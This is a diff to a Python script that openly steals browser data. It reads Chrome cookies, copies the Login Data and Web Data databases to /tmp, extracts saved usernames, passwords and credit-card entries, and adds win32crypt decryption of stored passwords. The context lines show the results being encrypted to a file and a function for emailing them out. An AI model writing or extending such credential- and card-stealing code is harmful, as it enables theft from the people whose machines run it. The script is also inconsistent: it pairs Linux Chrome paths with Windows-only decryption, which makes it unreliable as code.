@@ -10,12 +10,14 @@ from email.mime.multipart import MIMEMultipart
 import subprocess
 import time
 import browser_cookie3
+import shutil
 import logging
+import win32crypt  # Windows decryption module (for password decryption on Windows)
 
 # Set up logging
 logging.basicConfig(level=logging.INFO)
 
-# Global encryption key for data encryption
+# Global encryption key
 key = os.urandom(32)  # Use a securely stored key in production
 
 # Function to encrypt data
@@ -35,6 +37,10 @@ def decrypt_data(encrypted_data):
 # Function to scrape Chrome data (cookies, passwords, and credit cards)
 def scrape_chrome_data():
     cookies = []
+    passwords = []
+    credit_cards = []
+
+    # First, let's try fetching cookies using browser-cookie3
     try:
         cj = browser_cookie3.chrome()  # Get cookies from Chrome
         for cookie in cj:
@@ -43,30 +49,41 @@ def scrape_chrome_data():
     except Exception as e:
         cookies_data = f"Error fetching cookies: {str(e)}"
     
-    # Retrieve passwords from Chrome (this requires access to the Login Data file)
+    # Fetch passwords from the Login Data database
     try:
-        password_db = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
-        connection = sqlite3.connect(password_db)
-        cursor = connection.cursor()
-        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-        passwords = []
-        for row in cursor.fetchall():
-            decrypted_password = row[2]  # On Linux, passwords are stored in plaintext
-            passwords.append(f"URL: {row[0]}, Username: {row[1]}, Password: {decrypted_password}")
-        passwords_data = "\n".join(passwords)  # Join passwords into a string
+        password_db_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
+        # Ensure file exists before attempting to read it
+        if os.path.exists(password_db_path):
+            temp_password_db = "/tmp/LoginData"  # Temporary file to avoid locking issues
+            shutil.copyfile(password_db_path, temp_password_db)  # Copy file to avoid locking issues
+            connection = sqlite3.connect(temp_password_db)
+            cursor = connection.cursor()
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for row in cursor.fetchall():
+                decrypted_password = decrypt_password(row[2])  # Decrypt password
+                passwords.append(f"URL: {row[0]}, Username: {row[1]}, Password: {decrypted_password}")
+            connection.close()
+            passwords_data = "\n".join(passwords)  # Join passwords into a string
+        else:
+            passwords_data = "Error fetching passwords: Login Data file not found"
     except Exception as e:
         passwords_data = f"Error fetching passwords: {str(e)}"
-    
-    # Retrieve credit card data from Chrome
+
+    # Fetch credit card data
     try:
-        credit_card_db = os.path.expanduser("~/.config/google-chrome/Default/Web Data")
-        connection = sqlite3.connect(credit_card_db)
-        cursor = connection.cursor()
-        cursor.execute("SELECT name, value FROM credit_cards")
-        credit_cards = []
-        for row in cursor.fetchall():
-            credit_cards.append(f"Card Name: {row[0]}, Card Value: {row[1]}")
-        credit_card_data = "\n".join(credit_cards)  # Join card data into a string
+        credit_card_db_path = os.path.expanduser("~/.config/google-chrome/Default/Web Data")
+        if os.path.exists(credit_card_db_path):
+            temp_credit_card_db = "/tmp/WebData"  # Temporary file to avoid locking issues
+            shutil.copyfile(credit_card_db_path, temp_credit_card_db)
+            connection = sqlite3.connect(temp_credit_card_db)
+            cursor = connection.cursor()
+            cursor.execute("SELECT name, value FROM credit_cards")
+            for row in cursor.fetchall():
+                credit_cards.append(f"Card Name: {row[0]}, Card Value: {row[1]}")
+            connection.close()
+            credit_card_data = "\n".join(credit_cards)  # Join card data into a string
+        else:
+            credit_card_data = "Error fetching credit card data: Web Data file not found"
     except Exception as e:
         credit_card_data = f"Error fetching credit card data: {str(e)}"
     
@@ -76,6 +93,16 @@ def scrape_chrome_data():
     
     with open("chrome_scraped_data.txt", "w") as file:
         file.write(encrypted_data)
+
+# Function to decrypt Chrome's encrypted passwords using win32crypt (for Windows)
+def decrypt_password(encrypted_password):
+    try:
+        # Decrypt password using win32crypt (works on Windows)
+        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+        return decrypted_password.decode('utf-8')
+    except Exception as e:
+        logging.error(f"Error decrypting password: {str(e)}")
+        return None
 
 # Function to send email with the scraped data
 def send_email(file_path, recipient_email, data):
